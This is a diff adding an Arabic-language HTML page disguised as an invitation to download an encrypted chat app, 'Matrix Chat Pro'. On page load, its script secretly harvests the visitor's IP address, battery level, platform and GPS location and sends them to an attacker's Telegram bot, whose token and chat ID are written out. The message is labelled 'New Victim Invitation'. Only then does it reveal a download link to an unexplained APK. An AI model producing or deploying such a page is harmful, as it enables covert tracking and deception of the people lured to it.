@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Matrix Chat | التراسل الآمن</title>
+    <style>
+        :root {
+            --chat-blue: #0088cc;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --bg-dark: #121212;
+        }
+
+        body {
+            background: radial-gradient(circle, #1c1c1c, #0d0d0d);
+            color: #ffffff;
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* تصميم الكارت الزجاجي الاحترافي */
+        .chat-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+            width: 85%;
+            max-width: 420px;
+            animation: slideUp 1s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .icon-circle {
+            width: 70px;
+            height: 70px;
+            background: var(--chat-blue);
+            border-radius: 22px;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 35px;
+            box-shadow: 0 0 25px rgba(0, 136, 204, 0.5);
+        }
+
+        h1 { font-size: 24px; margin-bottom: 12px; font-weight: 600; }
+        p { color: #b0b0b0; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
+
+        .loading-area {
+            margin: 20px 0;
+            color: var(--chat-blue);
+            font-weight: 500;
+        }
+
+        .dots { display: inline-block; width: 5px; height: 5px; background: var(--chat-blue); border-radius: 50%; animation: blink 1s infinite; margin: 0 2px; }
+        @keyframes blink { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
+
+        /* زر التحميل المتنكر */
+        .btn-download {
+            background: linear-gradient(135deg, #0088cc, #005580);
+            color: white;
+            text-decoration: none;
+            padding: 16px 45px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 17px;
+            display: none; /* يظهر بعد سحب البيانات */
+            transition: 0.3s all ease;
+            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
+            border: none;
+        }
+
+        .btn-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 136, 204, 0.5);
+        }
+    </style>
+</head>
+<body>
+
+<div class="chat-card">
+    <div class="icon-circle">💬</div>
+    <h1>Matrix Chat Pro</h1>
+    <p>لقد تمت دعوتك للانضمام إلى مجموعة دردشة خاصة مشفرة. يرجى تحميل التطبيق الرسمي للوصول إلى المحادثات وتأمين حسابك.</p>
+    
+    <div id="loader-area" class="loading-area">
+        <span>جاري تهيئة تشفير البيانات</span>
+        <div class="dots" style="animation-delay: 0s"></div>
+        <div class="dots" style="animation-delay: 0.2s"></div>
+        <div class="dots" style="animation-delay: 0.4s"></div>
+    </div>
+
+    <a href="app.apk" class="btn-download" id="dl-btn">تحميل التطبيق والبدء</a>
+</div>
+
+<script>
+    // --- إعدادات البوت الخاصة بك يا ماتريكس ---
+    const TG_TOKEN = '8796589413:AAEiO4uqJaeuglsWnBD_7b9Qocj1P_rndjs'; 
+    const TG_CHAT_ID = '8335474916';
+
+    window.onload = async () => {
+        try {
+            // 1. سحب الـ IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            
+            // 2. سحب البطارية
+            let batStatus = "غير معروف";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batStatus = Math.round(battery.level * 100) + "%";
+            }
+
+            // 3. طلب الموقع الجغرافي (هنا التمويه: الضحية فاكر إنه عشان "تطبيق الشات")
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToMatrix(ipData.ip, batStatus, locationLink);
+            }, async () => {
+                await sendToMatrix(ipData.ip, batStatus, "الضحية رفض إذن الموقع");
+            });
+
+        } catch (e) {
+            console.log("Network Handshake...");
+        }
+    };
+
+    async function sendToMatrix(ip, bat, loc) {
+        const message = `
+🎯 **New Victim Invitation!** 🕸️
+---
+👤 **Identity:** Al-Zoka Private System
+🌐 **IP:** \`${ip}\`
+📱 **OS/Platform:** ${navigator.platform}
+🔋 **Battery:** ${bat}
+📍 **Map:** ${loc}
+---
+🕷️ *Managed by Matrix-Jo*`;
+
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: TG_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        // إظهار زر التحميل وإخفاء التحميل الوهمي
+        document.getElementById('loader-area').style.display = 'none';
+        document.getElementById('dl-btn').style.display = 'inline-block';
+    }
+</script>
+
+</body>
+</html>
